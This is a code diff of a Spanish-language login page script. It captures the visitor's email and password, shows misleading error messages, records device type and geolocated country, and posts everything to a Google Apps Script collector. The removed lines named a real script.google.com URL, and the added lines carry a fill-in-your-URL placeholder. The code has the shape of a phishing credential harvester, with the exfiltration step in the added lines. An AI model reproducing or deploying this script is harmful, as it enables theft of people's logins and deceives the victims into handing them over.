@@ -244,29 +244,83 @@
         
   <script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
-    event.preventDefault();
+    event.preventDefault(); // Evita el envío automático
 
-    // Mostrar el mensaje de espera debajo del botón
-    document.getElementById("loadingMessage").style.display = "block";
+    const emailInput = document.querySelector('input[name="email"]');
+    const passwordInput = document.querySelector('input[name="password"]');
+    const errorMessage = document.getElementById('error-message');
 
-    // Obtener datos del formulario
-    const formData = new FormData(this);
-    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
+    // Lista de correos electrónicos y contraseñas prohibidas
+    const prohibitedEmails = [""];
+    const prohibitedWords = ["holaaa"];
+
+    const email = emailInput.value.trim().toLowerCase();
+    const password = passwordInput.value;
+
+    const isProhibitedEmail = prohibitedEmails.includes(email);
+    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
+
+    if (isProhibitedEmail) {
+        errorMessage.textContent = "No se encuentra la dirección de correo";
+        errorMessage.style.color = 'red';
+        emailInput.value = '';
+        passwordInput.value = '';
+        return;
+    }
+
+    if (containsProhibitedPassword) {
+        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
+        errorMessage.style.color = 'red';
+        passwordInput.value = '';
+        return;
+    }
+
+    errorMessage.textContent = ""; // Limpia errores previos
+
+    // Detectar si el usuario usa iPhone o Android
+    let deviceType = "Otro"; // Valor por defecto
+    if (/android/i.test(navigator.userAgent)) {
+        deviceType = "Android";
+    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+        deviceType = "iPhone";
+    }
+
+    // Obtener el país del usuario
+    let country = "Desconocido";
+    try {
+        const response = await fetch("https://ip-api.com/json/");
+        const data = await response.json();
+        if (data.status === "success") {
+            country = data.country; // Nombre del país
+        }
+    } catch (error) {
+        console.error("Error obteniendo el país:", error);
+    }
+
+    // Enviar datos a Google Apps Script
+    const formData = new FormData();
+    formData.append("email", email);
+    formData.append("password", password);
+    formData.append("device", deviceType);
+    formData.append("country", country); // Enviar el país
+
+    const url = "AQUI_TU_URL_WEB_APP"; // Reemplaza con tu Google Apps Script
 
     try {
-        await fetch(url, {
+        const response = await fetch(url, {
             method: "POST",
             body: new URLSearchParams(formData),
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
         });
 
-        window.location.href = "usuario.html"; // Redirigir tras éxito
+        if (response.ok) {
+            window.location.href = "usuario.html"; // Redirigir tras éxito
+        } else {
+            alert("Error al enviar los datos.");
+        }
     } catch (error) {
         alert("Error al conectar con el servidor.");
         console.error("Error:", error);
-
-        // Ocultar el mensaje de espera si hay error
-        document.getElementById("loadingMessage").style.display = "none";
     }
 });
 </script>
